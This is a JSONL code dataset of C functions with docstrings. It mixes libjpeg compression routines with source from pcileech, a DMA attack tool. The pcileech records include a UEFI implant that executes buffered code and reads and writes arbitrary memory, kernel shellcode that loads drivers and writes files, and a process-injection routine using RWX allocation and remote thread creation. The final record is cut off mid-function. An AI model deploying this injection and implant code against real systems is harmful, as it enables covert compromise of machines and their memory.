{"docstring": "/*\n * Downsample pixel values of a single component.\n * This version handles the common case of 2:1 horizontal and 1:1 vertical,\n * without smoothing.\n *\n * A note about the \"bias\" calculations: when rounding fractional values to\n * integer, we do not want to always round 0.5 up to the next integer.\n * If we did that, we'd introduce a noticeable bias towards larger values.\n * Instead, this code is arranged so that 0.5 will be rounded up or down at\n * alternate pixel locations (a simple ordered dither pattern).\n */\n", "func_signal": "METHODDEF(void)\nh2v1_downsample (j_compress_ptr cinfo, jpeg_component_info * compptr,\n\t\t JSAMPARRAY input_data, JSAMPARRAY output_data)", "code": "{\n  int outrow;\n  JDIMENSION outcol;\n  JDIMENSION output_cols = compptr->width_in_blocks * DCTSIZE;\n  register JSAMPROW inptr, outptr;\n  register int bias;\n\n  /* Expand input data enough to let all the output samples be generated\n   * by the standard loop.  Special-casing padded output would be more\n   * efficient.\n   */\n  expand_right_edge(input_data, cinfo->max_v_samp_factor,\n\t\t    cinfo->image_width, output_cols * 2);\n\n  for (outrow = 0; outrow < compptr->v_samp_factor; outrow++) {\n    outptr = output_data[outrow];\n    inptr = input_data[outrow];\n    bias = 0;\t\t\t/* bias = 0,1,0,1,... for successive samples */\n    for (outcol = 0; outcol < output_cols; outcol++) {\n      *outptr++ = (JSAMPLE) ((GETJSAMPLE(*inptr) + GETJSAMPLE(inptr[1])\n\t\t\t      + bias) >> 1);\n      bias ^= 1;\t\t/* 0=>1, 1=>0 */\n      inptr += 2;\n    }\n  }\n}", "path": "licecap/WDL/jpeglib/jcsample.c", "commit_date": "2015-01-10 00:00:00", "repo_name": "justinfrankel/licecap", "stars": 5168, "license": "None", "language": "c", "size": 10279}
{"docstring": "/*\n * Initialize for a Huffman-compressed scan using progressive JPEG.\n */\n", "func_signal": "METHODDEF(void)\nstart_pass_phuff (j_compress_ptr cinfo, boolean gather_statistics)", "code": "{  \n  phuff_entropy_ptr entropy = (phuff_entropy_ptr) cinfo->entropy;\n  boolean is_DC_band;\n  int ci, tbl;\n  jpeg_component_info * compptr;\n\n  entropy->cinfo = cinfo;\n  entropy->gather_statistics = gather_statistics;\n\n  is_DC_band = (cinfo->Ss == 0);\n\n  /* We assume jcmaster.c already validated the scan parameters. */\n\n  /* Select execution routines */\n  if (cinfo->Ah == 0) {\n    if (is_DC_band)\n      entropy->pub.encode_mcu = encode_mcu_DC_first;\n    else\n      entropy->pub.encode_mcu = encode_mcu_AC_first;\n  } else {\n    if (is_DC_band)\n      entropy->pub.encode_mcu = encode_mcu_DC_refine;\n    else {\n      entropy->pub.encode_mcu = encode_mcu_AC_refine;\n      /* AC refinement needs a correction bit buffer */\n      if (entropy->bit_buffer == NULL)\n\tentropy->bit_buffer = (char *)\n\t  (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_IMAGE,\n\t\t\t\t      MAX_CORR_BITS * SIZEOF(char));\n    }\n  }\n  if (gather_statistics)\n    entropy->pub.finish_pass = finish_pass_gather_phuff;\n  else\n    entropy->pub.finish_pass = finish_pass_phuff;\n\n  /* Only DC coefficients may be interleaved, so cinfo->comps_in_scan = 1\n   * for AC coefficients.\n   */\n  for (ci = 0; ci < cinfo->comps_in_scan; ci++) {\n    compptr = cinfo->cur_comp_info[ci];\n    /* Initialize DC predictions to 0 */\n    entropy->last_dc_val[ci] = 0;\n    /* Get table index */\n    if (is_DC_band) {\n      if (cinfo->Ah != 0)\t/* DC refinement needs no table */\n\tcontinue;\n      tbl = compptr->dc_tbl_no;\n    } else {\n      entropy->ac_tbl_no = tbl = compptr->ac_tbl_no;\n    }\n    if (gather_statistics) {\n      /* Check for invalid table index */\n      /* (make_c_derived_tbl does this in the other path) */\n      if (tbl < 0 || tbl >= NUM_HUFF_TBLS)\n        ERREXIT1(cinfo, JERR_NO_HUFF_TABLE, tbl);\n      /* Allocate and zero the statistics tables */\n      /* Note that jpeg_gen_optimal_table expects 257 entries in each table! */\n      if (entropy->count_ptrs[tbl] == NULL)\n\tentropy->count_ptrs[tbl] = (long *)\n\t  (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_IMAGE,\n\t\t\t\t      257 * SIZEOF(long));\n      MEMZERO(entropy->count_ptrs[tbl], 257 * SIZEOF(long));\n    } else {\n      /* Compute derived values for Huffman table */\n      /* We may do this more than once for a table, but it's not expensive */\n      jpeg_make_c_derived_tbl(cinfo, is_DC_band, tbl,\n\t\t\t      & entropy->derived_tbls[tbl]);\n    }\n  }\n\n  /* Initialize AC stuff */\n  entropy->EOBRUN = 0;\n  entropy->BE = 0;\n\n  /* Initialize bit buffer to empty */\n  entropy->put_buffer = 0;\n  entropy->put_bits = 0;\n\n  /* Initialize restart stuff */\n  entropy->restarts_to_go = cinfo->restart_interval;\n  entropy->next_restart_num = 0;\n}", "path": "licecap/WDL/jpeglib/jcphuff.c", "commit_date": "2015-01-10 00:00:00", "repo_name": "justinfrankel/licecap", "stars": 5168, "license": "None", "language": "c", "size": 10279}
{"docstring": "/*\n * Allocate workspace for Floyd-Steinberg errors.\n */\n", "func_signal": "LOCAL(void)\nalloc_fs_workspace (j_decompress_ptr cinfo)", "code": "{\n  my_cquantize_ptr cquantize = (my_cquantize_ptr) cinfo->cquantize;\n  size_t arraysize;\n  int i;\n\n  arraysize = (size_t) ((cinfo->output_width + 2) * SIZEOF(FSERROR));\n  for (i = 0; i < cinfo->out_color_components; i++) {\n    cquantize->fserrors[i] = (FSERRPTR)\n      (*cinfo->mem->alloc_large)((j_common_ptr) cinfo, JPOOL_IMAGE, arraysize);\n  }\n}", "path": "licecap/WDL/jpeglib/jquant1.c", "commit_date": "2015-01-10 00:00:00", "repo_name": "justinfrankel/licecap", "stars": 5168, "license": "None", "language": "c", "size": 10279}
{"docstring": "/*\n * Finish up a statistics-gathering pass and create the new Huffman tables.\n */\n", "func_signal": "METHODDEF(void)\nfinish_pass_gather_phuff (j_compress_ptr cinfo)", "code": "{\n  phuff_entropy_ptr entropy = (phuff_entropy_ptr) cinfo->entropy;\n  boolean is_DC_band;\n  int ci, tbl;\n  jpeg_component_info * compptr;\n  JHUFF_TBL **htblptr;\n  boolean did[NUM_HUFF_TBLS];\n\n  /* Flush out buffered data (all we care about is counting the EOB symbol) */\n  emit_eobrun(entropy);\n\n  is_DC_band = (cinfo->Ss == 0);\n\n  /* It's important not to apply jpeg_gen_optimal_table more than once\n   * per table, because it clobbers the input frequency counts!\n   */\n  MEMZERO(did, SIZEOF(did));\n\n  for (ci = 0; ci < cinfo->comps_in_scan; ci++) {\n    compptr = cinfo->cur_comp_info[ci];\n    if (is_DC_band) {\n      if (cinfo->Ah != 0)\t/* DC refinement needs no table */\n\tcontinue;\n      tbl = compptr->dc_tbl_no;\n    } else {\n      tbl = compptr->ac_tbl_no;\n    }\n    if (! did[tbl]) {\n      if (is_DC_band)\n        htblptr = & cinfo->dc_huff_tbl_ptrs[tbl];\n      else\n        htblptr = & cinfo->ac_huff_tbl_ptrs[tbl];\n      if (*htblptr == NULL)\n        *htblptr = jpeg_alloc_huff_table((j_common_ptr) cinfo);\n      jpeg_gen_optimal_table(cinfo, *htblptr, entropy->count_ptrs[tbl]);\n      did[tbl] = TRUE;\n    }\n  }\n}", "path": "licecap/WDL/jpeglib/jcphuff.c", "commit_date": "2015-01-10 00:00:00", "repo_name": "justinfrankel/licecap", "stars": 5168, "license": "None", "language": "c", "size": 10279}
{"docstring": "/*\n * MCU encoding for AC initial scan (either spectral selection,\n * or first pass of successive approximation).\n */\n", "func_signal": "METHODDEF(boolean)\nencode_mcu_AC_first (j_compress_ptr cinfo, JBLOCKROW *MCU_data)", "code": "{\n  phuff_entropy_ptr entropy = (phuff_entropy_ptr) cinfo->entropy;\n  register int temp, temp2;\n  register int nbits;\n  register int r, k;\n  int Se = cinfo->Se;\n  int Al = cinfo->Al;\n  JBLOCKROW block;\n\n  entropy->next_output_byte = cinfo->dest->next_output_byte;\n  entropy->free_in_buffer = cinfo->dest->free_in_buffer;\n\n  /* Emit restart marker if needed */\n  if (cinfo->restart_interval)\n    if (entropy->restarts_to_go == 0)\n      emit_restart(entropy, entropy->next_restart_num);\n\n  /* Encode the MCU data block */\n  block = MCU_data[0];\n\n  /* Encode the AC coefficients per section G.1.2.2, fig. G.3 */\n  \n  r = 0;\t\t\t/* r = run length of zeros */\n   \n  for (k = cinfo->Ss; k <= Se; k++) {\n    if ((temp = (*block)[jpeg_natural_order[k]]) == 0) {\n      r++;\n      continue;\n    }\n    /* We must apply the point transform by Al.  For AC coefficients this\n     * is an integer division with rounding towards 0.  To do this portably\n     * in C, we shift after obtaining the absolute value; so the code is\n     * interwoven with finding the abs value (temp) and output bits (temp2).\n     */\n    if (temp < 0) {\n      temp = -temp;\t\t/* temp is abs value of input */\n      temp >>= Al;\t\t/* apply the point transform */\n      /* For a negative coef, want temp2 = bitwise complement of abs(coef) */\n      temp2 = ~temp;\n    } else {\n      temp >>= Al;\t\t/* apply the point transform */\n      temp2 = temp;\n    }\n    /* Watch out for case that nonzero coef is zero after point transform */\n    if (temp == 0) {\n      r++;\n      continue;\n    }\n\n    /* Emit any pending EOBRUN */\n    if (entropy->EOBRUN > 0)\n      emit_eobrun(entropy);\n    /* if run length > 15, must emit special run-length-16 codes (0xF0) */\n    while (r > 15) {\n      emit_symbol(entropy, entropy->ac_tbl_no, 0xF0);\n      r -= 16;\n    }\n\n    /* Find the number of bits needed for the magnitude of the coefficient */\n    nbits = 1;\t\t\t/* there must be at least one 1 bit */\n    while ((temp >>= 1))\n      nbits++;\n    /* Check for out-of-range coefficient values */\n    if (nbits > MAX_COEF_BITS)\n      ERREXIT(cinfo, JERR_BAD_DCT_COEF);\n\n    /* Count/emit Huffman symbol for run length / number of bits */\n    emit_symbol(entropy, entropy->ac_tbl_no, (r << 4) + nbits);\n\n    /* Emit that number of bits of the value, if positive, */\n    /* or the complement of its magnitude, if negative. */\n    emit_bits(entropy, (unsigned int) temp2, nbits);\n\n    r = 0;\t\t\t/* reset zero run length */\n  }\n\n  if (r > 0) {\t\t\t/* If there are trailing zeroes, */\n    entropy->EOBRUN++;\t\t/* count an EOB */\n    if (entropy->EOBRUN == 0x7FFF)\n      emit_eobrun(entropy);\t/* force it out to avoid overflow */\n  }\n\n  cinfo->dest->next_output_byte = entropy->next_output_byte;\n  cinfo->dest->free_in_buffer = entropy->free_in_buffer;\n\n  /* Update restart-interval state too */\n  if (cinfo->restart_interval) {\n    if (entropy->restarts_to_go == 0) {\n      entropy->restarts_to_go = cinfo->restart_interval;\n      entropy->next_restart_num++;\n      entropy->next_restart_num &= 7;\n    }\n    entropy->restarts_to_go--;\n  }\n\n  return TRUE;\n}", "path": "licecap/WDL/jpeglib/jcphuff.c", "commit_date": "2015-01-10 00:00:00", "repo_name": "justinfrankel/licecap", "stars": 5168, "license": "None", "language": "c", "size": 10279}
{"docstring": "/*\n * Emit bits from a correction bit buffer.\n */\n", "func_signal": "LOCAL(void)\nemit_buffered_bits (phuff_entropy_ptr entropy, char * bufstart,\n\t\t    unsigned int nbits)", "code": "{\n  if (entropy->gather_statistics)\n    return;\t\t\t/* no real work */\n\n  while (nbits > 0) {\n    emit_bits(entropy, (unsigned int) (*bufstart), 1);\n    bufstart++;\n    nbits--;\n  }\n}", "path": "licecap/WDL/jpeglib/jcphuff.c", "commit_date": "2015-01-10 00:00:00", "repo_name": "justinfrankel/licecap", "stars": 5168, "license": "None", "language": "c", "size": 10279}
{"docstring": "// ----------------------------------------------------------------------------\n// _kbhit functionality below:\n// ----------------------------------------------------------------------------\n", "func_signal": "VOID terminal_enable_raw_mode()", "code": "{\n    struct termios term;\n    tcgetattr(0, &term);\n    term.c_lflag &= ~(ICANON | ECHO); // Disable echo as well\n    tcsetattr(0, TCSANOW, &term);\n}", "path": "pcileech/pcileech/oscompatibility.c", "commit_date": "2020-08-03 00:00:00", "repo_name": "ufrisk/pcileech", "stars": 4176, "license": "agpl-3.0", "language": "c", "size": 4614}
{"docstring": "// status:\n//     1: ready for command\n//     2: processing\n//     f0000000: terminated\n//     f0000000+: error\n// op: - see KMD_CMD defines\n// result:\n//    0: FALSE\n//    1: TRUE\n// address:\n//    physical base address for memory operation\n// size:\n//    size of memory operation\n", "func_signal": "VOID c_EntryPoint(PKMDDATA pk, QWORD paUEFI_IBI_SYST)", "code": "{\n\tQWORD status, addr;\n\t// 1: set up kmd data\n\tSetMem((PQWORD)pk, 0x1000, 0);\n\tpk->MAGIC = 0x0ff11337711333377;\n\tpk->OperatingSystem = KMDDATA_OPERATING_SYSTEM_UEFI;\n\tpk->ReservedKMD[0] = paUEFI_IBI_SYST; // Address of UEFI system table\n\t// 2: allocate memory for buffer\n\taddr = 0xffffffff;\n\tpk->DMASizeBuffer = 0x01000000;\n\tstatus = AllocatePages(1, EfiBootServicesData, 0x1000, &addr);\n\tif(status) {\n\t\taddr = 0xffffffff;\n\t\tpk->DMASizeBuffer = 0x00400000;\n\t\tstatus = AllocatePages(1, EfiBootServicesData, 0x400, &addr);\n\t\tif(status) {\n\t\t\tpk->_status = 0xf0000002;\n\t\t\treturn;\n\t\t}\n\t}\n\tpk->DMAAddrPhysical = addr;\n\tpk->DMAAddrVirtual = addr;\n\t// 3: disable any watchdog timer (if exists)\n\tpk->dataOut[2] = SetWatchdogTimer(0, 0, 0, 0);\n\t// 4: main command loop.\n\twhile(TRUE) {\n\t\tpk->_status = 1;\n\t\tif (KMD_CMD_COMPLETED == pk->_op) { // NOP\n\t\t\tcontinue;\n\t\t}\n\t\tpk->_status = 2;\n\t\tif (KMD_CMD_TERMINATE == pk->_op) { // EXIT\n\t\t\tFreePages(pk->DMAAddrPhysical, pk->DMASizeBuffer / 0x1000);\n\t\t\tpk->_status = 0xf0000000;\n\t\t\tpk->DMAAddrPhysical = 0;\n\t\t\tpk->DMAAddrVirtual = 0;\n\t\t\tpk->_result = TRUE;\n\t\t\tpk->MAGIC = 0;\n\t\t\tpk->_op = KMD_CMD_COMPLETED;\n\t\t\treturn;\n\t\t}\n\t\tif(KMD_CMD_MEM_INFO == pk->_op) { // INFO (physical section map)\n\t\t\tpk->_result = GetMemoryMapFromEfi(pk);\n\t\t}\n\t\tif(KMD_CMD_EXEC == pk->_op) { // EXEC at start of buffer\n\t\t\t((VOID(*)(PKMDDATA pk, PQWORD dataIn, PQWORD dataOut))pk->DMAAddrPhysical)(pk, pk->dataIn, pk->dataOut);\n\t\t\tpk->_result = TRUE;\n\t\t}\n\t\tif((KMD_CMD_READ == pk->_op) || KMD_CMD_READ_VA == pk->_op) { // MEMORY READ (PHYSICAL/VIRTUAL 1:1 MAPPED IN UEFI)\n\t\t\tCopyMem((PQWORD)pk->DMAAddrPhysical, (PQWORD)pk->_address, pk->_size);\n\t\t\tpk->_result = TRUE;\n\t\t}\n\t\tif((KMD_CMD_WRITE == pk->_op) || KMD_CMD_WRITE_VA == pk->_op) { // MEMORY WRITE (PHYSICAL/VIRTUAL 1:1 MAPPED IN UEFI)\n\t\t\tCopyMem((PQWORD)pk->_address, (PQWORD)pk->DMAAddrPhysical, pk->_size);\n\t\t\tpk->_result = TRUE;\n\t\t}\n\t\tpk->_op = KMD_CMD_COMPLETED;\n\t}\n}", "path": "pcileech/pcileech_shellcode/uefi_kmd_c.c", "commit_date": "2017-12-17 00:00:00", "repo_name": "ufrisk/pcileech", "stars": 4176, "license": "agpl-3.0", "language": "c", "size": 4614}
{"docstring": "/*\n* Load a driver by service name.\n*/\n", "func_signal": "NTSTATUS DriverLoadByServiceName(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk, _In_ PKERNEL_FUNCTIONS2 fnk2)", "code": "{\n\tNTSTATUS nt;\n\tANSI_STRING saServicePath;\n\tUNICODE_STRING usServicePath;\n\tfnk->RtlCopyMemory(pk->dataOutStr, pk->dataInStr, MAX_PATH);\n\tfnk->RtlInitAnsiString(&saServicePath, pk->dataInStr);\n\tfnk->RtlAnsiStringToUnicodeString(&usServicePath, &saServicePath, TRUE);\n\tnt = fnk2->ZwLoadDriver(&usServicePath);\n\tfnk->RtlFreeUnicodeString(&usServicePath);\n\treturn nt;\n}", "path": "pcileech/pcileech_shellcode/wx64_driverload_svc.c", "commit_date": "2016-08-09 00:00:00", "repo_name": "ufrisk/pcileech", "stars": 4176, "license": "agpl-3.0", "language": "c", "size": 4614}
{"docstring": "// ----------------------------------------------------------------------------\n// CRITICAL_SECTION functionality below:\n// ----------------------------------------------------------------------------\n", "func_signal": "VOID InitializeCriticalSection(LPCRITICAL_SECTION lpCriticalSection)", "code": "{\n    memset(lpCriticalSection, 0, sizeof(CRITICAL_SECTION));\n    pthread_mutexattr_init(&lpCriticalSection->mta);\n    pthread_mutexattr_settype(&lpCriticalSection->mta, PTHREAD_MUTEX_RECURSIVE);\n    pthread_mutex_init(&lpCriticalSection->mutex, &lpCriticalSection->mta);\n}", "path": "pcileech/pcileech/oscompatibility.c", "commit_date": "2020-08-03 00:00:00", "repo_name": "ufrisk/pcileech", "stars": 4176, "license": "agpl-3.0", "language": "c", "size": 4614}
{"docstring": "/*\n* Try create a registry service that may be used by ZwLoadDriver to load a driver.\n*/\n", "func_signal": "NTSTATUS DriverRegCreateService(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk, _In_ PKERNEL_FUNCTIONS2 fnk2, _Out_ WCHAR wszServicePath[MAX_PATH])", "code": "{\n\tNTSTATUS nt;\n\tWCHAR WSZ_ServicePathBase[] = { '\\\\', 'R', 'e', 'g', 'i', 's', 't', 'r', 'y', '\\\\',  'M', 'a', 'c', 'h', 'i', 'n', 'e', '\\\\', 'S', 'y', 's', 't', 'e', 'm', '\\\\', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'C', 'o', 'n', 't', 'r', 'o', 'l', 'S', 'e', 't', '\\\\', 'S', 'e', 'r', 'v', 'i', 'c', 'e', 's', '\\\\', 0 };\n\tUNICODE_STRING usRegPath, usImagePath;\n\tOBJECT_ATTRIBUTES _oaReg;\n\tLPWSTR wszImageName;\n\tHANDLE hKeyHandle;\n\t// fetch image name and path\n\tnt = DriverRegGetImagePath(pk, fnk, fnk2, &usImagePath);\n\tif(NT_ERROR(nt)) {\n\t\treturn nt;\n\t}\n\twszImageName = DriverRegGetImageNameFromPath(usImagePath.Buffer);\n\tfnk->RtlCopyMemory(wszServicePath, WSZ_ServicePathBase, sizeof(WSZ_ServicePathBase) + 2);\n\tfnk2->wcscat(wszServicePath, wszImageName);\n\tfnk->RtlInitUnicodeString(&usRegPath, wszServicePath);\n\t// create the reg key\n\tInitializeObjectAttributes(&_oaReg, &usRegPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);\n\tnt = fnk2->ZwCreateKey(&hKeyHandle, KEY_ALL_ACCESS, &_oaReg, 0, NULL, REG_OPTION_VOLATILE, NULL);\n\tif(NT_SUCCESS(nt)) {\n\t\tDriverRegSetServiceKeys(pk, fnk, fnk2, hKeyHandle, &usImagePath);\n\t}\n\tfnk->RtlFreeUnicodeString(&usImagePath);\n\tfnk->ZwClose(hKeyHandle);\n\treturn nt;\n}", "path": "pcileech/pcileech_shellcode/wx64_driverload_svc.c", "commit_date": "2016-08-09 00:00:00", "repo_name": "ufrisk/pcileech", "stars": 4176, "license": "agpl-3.0", "language": "c", "size": 4614}
{"docstring": "// 1MB offset\n", "func_signal": "BOOL GetMemoryMapFromEfi(PKMDDATA pk)", "code": "{\n\tQWORD status, cbBuffer, qwMapKey, cbDescriptor, qwDecriptorVersion;\n\tQWORD o = 0, addr = 0, addrMax = 0;\n\tPEFI_MEMORY_DESCRIPTOR pmd;\n\tPPHYSICAL_MEMORY_RANGE pmr;\n\t// fetch the efi memory map\n\tcbBuffer = pk->DMASizeBuffer - OFFSET_EFI_MEMMAP_DMABUFFER;\n\tstatus = GetMemoryMap(\n\t\t&cbBuffer,\n\t\t(PQWORD)(pk->DMAAddrPhysical + OFFSET_EFI_MEMMAP_DMABUFFER),\n\t\t&qwMapKey,\n\t\t&cbDescriptor,\n\t\t&qwDecriptorVersion);\n\tif(status) { return FALSE; }\n\t// fetch maximum physical address\n\twhile(TRUE) {\n\t\tif(o >= cbBuffer) { break; }\n\t\tpmd = (PEFI_MEMORY_DESCRIPTOR)(pk->DMAAddrPhysical + OFFSET_EFI_MEMMAP_DMABUFFER + o);\n\t\taddrMax = MAX(addrMax, pmd->PhysicalStart + pmd->NumberOfPages * 0x1000);\n\t\to += cbDescriptor;\n\t}\n\t// select readable memory out of the (potentially unordered) memory map\n\tpk->_size = sizeof(PHYSICAL_MEMORY_RANGE);\n\tpmr = (PPHYSICAL_MEMORY_RANGE)pk->DMAAddrPhysical;\n\tpmr->BaseAddress = 0;\n\tpmr->NumberOfBytes = 0;\n\twhile(addr < addrMax) {\n\t\to = 0;\n\t\twhile(TRUE) {\n\t\t\tif(o >= cbBuffer) { break; }\n\t\t\tpmd = (PEFI_MEMORY_DESCRIPTOR)(pk->DMAAddrPhysical + OFFSET_EFI_MEMMAP_DMABUFFER + o);\n\t\t\tif(addr == pmd->PhysicalStart) {\n\t\t\t\tif((pmd->Type < EfiMaxMemoryType) && (pmd->Type != EfiReservedMemoryType) && (pmd->Type != EfiUnusableMemory) && (pmd->Type != EfiMemoryMappedIO) && (pmd->Type != EfiMemoryMappedIOPortSpace)) {\n\t\t\t\t\tif(pmr->BaseAddress + pmr->NumberOfBytes == pmd->PhysicalStart) {\n\t\t\t\t\t\tpmr->NumberOfBytes += 0x1000 * pmd->NumberOfPages;\n\t\t\t\t\t} else {\n\t\t\t\t\t\tif(pmr->BaseAddress + pmr->NumberOfBytes) {\n\t\t\t\t\t\t\tpk->_size += sizeof(PHYSICAL_MEMORY_RANGE);\n\t\t\t\t\t\t\tpmr = (PPHYSICAL_MEMORY_RANGE)((QWORD)pmr + sizeof(PHYSICAL_MEMORY_RANGE));\n\t\t\t\t\t\t}\n\t\t\t\t\t\tpmr->BaseAddress = pmd->PhysicalStart;\n\t\t\t\t\t\tpmr->NumberOfBytes = 0x1000 * pmd->NumberOfPages;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\taddr += 0x1000 * pmd->NumberOfPages;\n\t\t\t\tgoto next_descriptor;\n\t\t\t}\n\t\t\to += cbDescriptor;\n\t\t}\n\t\t// not found\n\t\taddr += 0x1000;\n\t\tnext_descriptor:\n\t\t;\n\t}\n\treturn TRUE;\n}", "path": "pcileech/pcileech_shellcode/uefi_kmd_c.c", "commit_date": "2017-12-17 00:00:00", "repo_name": "ufrisk/pcileech", "stars": 4176, "license": "agpl-3.0", "language": "c", "size": 4614}
{"docstring": "//-----------------------------------------------------------------------------\n// Functions below.\n//-----------------------------------------------------------------------------\n", "func_signal": "NTSTATUS VfsWrite(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk, _In_ PVFS_OPERATION pop)", "code": "{\n\tUNREFERENCED_PARAMETER(pk);\n\tNTSTATUS nt;\n\tHANDLE hFile = 0;\n\tIO_STATUS_BLOCK _io;\n\tOBJECT_ATTRIBUTES _oa;\n\tUNICODE_STRING _su;\n\tULONG CreateDisposition;\n\tACCESS_MASK DesiredAccess;\n\tfnk->RtlZeroMemory(&_oa, sizeof(OBJECT_ATTRIBUTES));\n\tfnk->RtlZeroMemory(&_io, sizeof(IO_STATUS_BLOCK));\n\tfnk->RtlInitUnicodeString(&_su, pop->wszFileName);\n\tInitializeObjectAttributes(&_oa, &_su, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);\n\tDesiredAccess = (pop->flags & VFS_FLAGS_APPEND_ON_WRITE) ? FILE_APPEND_DATA : GENERIC_WRITE;\n\tCreateDisposition = ((pop->flags & VFS_FLAGS_TRUNCATE_ON_WRITE) && (0 == pop->offset)) ? FILE_OVERWRITE_IF : FILE_OPEN;\n\tnt = fnk->ZwCreateFile(&hFile, DesiredAccess, &_oa, &_io, NULL, FILE_ATTRIBUTE_NORMAL, 0, CreateDisposition, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);\n\tif(nt) { goto cleanup; }\n\tnt = fnk->ZwWriteFile(hFile, NULL, NULL, NULL, &_io, pop->pb, (DWORD)pop->cb, (PLARGE_INTEGER)&pop->offset, 0);\ncleanup:\n\tif(hFile) { fnk->ZwClose(hFile); }\n\treturn nt;\n}", "path": "pcileech/pcileech_shellcode/wx64_vfs.c", "commit_date": "2017-05-24 00:00:00", "repo_name": "ufrisk/pcileech", "stars": 4176, "license": "agpl-3.0", "language": "c", "size": 4614}
{"docstring": "//-------------------------------------------------------------------------------\n// Read cache functionality below.\n// (file and memory accesses are become extremely slow without caching).\n//-------------------------------------------------------------------------------\n", "func_signal": "_Success_(return)\nBOOL VfsCache_DirectoryGetSingle(_Out_ PVFS_RESULT_FILEINFO pfi, _Out_ PBOOL isExisting, _In_ LPCWSTR wcsPath, _In_ LPCWSTR wcsFile, _In_ PVFS_GLOBAL_STATE pds)", "code": "{\n    QWORD i, j, qwCurrentTickCount;\n    qwCurrentTickCount = GetTickCount64();\n    EnterCriticalSection(&pds->LockCache);\n    for(i = 0; i < CACHE_DIRECTORY_ENTRIES; i++) {\n        if(wcscmp(wcsPath, pds->CacheDirectory[i].wszDirectoryName)) {\n            continue;\n        }\n        if(qwCurrentTickCount > pds->CacheDirectory[i].qwExpireTickCount64) {\n            continue;\n        }\n        for(j = 0; j < pds->CacheDirectory[i].cfi; j++) {\n            if(!wcscmp(wcsFile, pds->CacheDirectory[i].pfi[j].wszFileName)) {\n                memcpy(pfi, &pds->CacheDirectory[i].pfi[j], sizeof(VFS_RESULT_FILEINFO));\n                LeaveCriticalSection(&pds->LockCache);\n                *isExisting = TRUE;\n                pds->Statistics.cLISTFILE.hit++;\n                return TRUE;\n            }\n        }\n        LeaveCriticalSection(&pds->LockCache);\n        *isExisting = FALSE;\n        pds->Statistics.cLISTFILE.miss++;\n        return TRUE;\n    }\n    LeaveCriticalSection(&pds->LockCache);\n    pds->Statistics.cLISTFILE.miss++;\n    return FALSE;\n}", "path": "pcileech/pcileech/vfs.c", "commit_date": "2020-08-03 00:00:00", "repo_name": "ufrisk/pcileech", "stars": 4176, "license": "agpl-3.0", "language": "c", "size": 4614}
{"docstring": "/*\n* Module main control routine. Connects to the parent process memory and injects\n* user mode code into it. Tries to spawn a thread by using RtlCreateUserThread if\n* function is exported by ntoskrnl - if not (win7) a fallback onto more complicated\n* KeInsertQueueApc is used instead. The injected code then creates the new process.\n*/\n", "func_signal": "VOID ActionDefault(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk, _In_ PKERNEL_FUNCTIONS2 fnk2)", "code": "{\n\tNTSTATUS nt;\n\tOBJECT_ATTRIBUTES ObjectAttributes;\n\tQWORD qwPID = pk->dataIn[0];\n\tPEPROCESS Process = NULL;\n\tPVOID pvAddressUserMode = NULL;\n\tSIZE_T cbUserModeMemory = 0x1000;\n\tQWORD qwAddrConsoleBuffer = 0;\n\tHANDLE ZwProcessHandle = NULL;\n\tKAPC_STATE ApcState;\n\tCLIENT_ID ClientId, ClientId_2;\n\tHANDLE hThread;\n\t// lookup process\n\tnt = fnk2->PsLookupProcessByProcessId((HANDLE)qwPID, &Process); // TODO: decrease handle needed???\n\tif(NT_ERROR(nt)) {\n\t\tpk->dataOut[0] = nt;\n\t\tpk->dataOut[1] = 0x01;\n\t\treturn;\n\t}\n\t// allocate memory\n\tfnk->RtlZeroMemory(&ObjectAttributes, sizeof(OBJECT_ATTRIBUTES));\n\tfnk->RtlZeroMemory(&ClientId, sizeof(CLIENT_ID));\n\tClientId.UniqueThread = 0;\n\tClientId.UniqueProcess = (HANDLE)qwPID;\n\tnt = fnk2->ZwOpenProcess(&ZwProcessHandle, PROCESS_ALL_ACCESS, &ObjectAttributes, &ClientId);\n\tif(NT_ERROR(nt)) {\n\t\tpk->dataOut[0] = nt;\n\t\tpk->dataOut[1] = 0x04;\n\t\tgoto fail;\n\t}\n\tnt = fnk2->ZwAllocateVirtualMemory(ZwProcessHandle, &pvAddressUserMode, 1, &cbUserModeMemory, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\tif(NT_ERROR(nt)) {\n\t\tpk->dataOut[0] = nt;\n\t\tpk->dataOut[1] = 0x05;\n\t\tgoto fail;\n\t}\n\t// Attach to user process memory\n\tfnk2->KeStackAttachProcess(Process, &ApcState);\n\t// Allocate memory for console buffer (if needed)\n\tif(pk->dataIn[2]) {\n\t\tqwAddrConsoleBuffer = SetupConsoleBufferUserMode(pk, fnk, fnk2);\n\t\tif(!qwAddrConsoleBuffer) {\n\t\t\tpk->dataOut[0] = (QWORD)E_FAIL;\n\t\t\tpk->dataOut[1] = 0x06;\n\t\t\tfnk2->KeUnstackDetachProcess(&ApcState);\n\t\t\tgoto fail;\n\t\t}\n\t}\n\t// Intialize user mode code\n\tnt = IntializeUserModeCode(pk, fnk, fnk2, (PBYTE)pvAddressUserMode, qwAddrConsoleBuffer);\n\tif(NT_ERROR(nt)) {\n\t\tpk->dataOut[0] = nt;\n\t\tpk->dataOut[1] = 0x07;\n\t\tfnk2->KeUnstackDetachProcess(&ApcState);\n\t\tgoto fail;\n\t}\n\t// Detach from user process memory\n\tfnk2->KeUnstackDetachProcess(&ApcState);\n\tif(fnk2->RtlCreateUserThread) {\n\t\tnt = fnk2->RtlCreateUserThread(ZwProcessHandle,\t0, FALSE, 0, NULL, NULL, (QWORD)pvAddressUserMode, 0, &hThread, &ClientId_2);\n\t\tif(NT_ERROR(nt)) { \n\t\t\tpk->dataOut[0] = nt;\n\t\t\tpk->dataOut[1] = 0x0A;\n\t\t\tgoto fail;\n\t\t}\n\t\tCommonSleep(fnk, 250);\n\t} \n#ifdef 